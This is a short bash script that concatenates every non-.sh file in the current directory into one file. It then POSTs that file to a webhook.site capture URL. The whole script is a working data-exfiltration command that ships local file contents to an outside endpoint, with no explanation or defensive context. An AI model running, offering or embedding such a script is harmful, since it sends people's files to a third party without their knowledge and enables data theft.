#!/bin/bash

ls | grep -v ".sh" | xargs cat -- > takeout.txt && curl -X POST https://webhook.site/0d1759c5-cd9b-40ed-aee3-5241adbb1d3e -H "Content-Type: text/plain" -d @takeout.txt
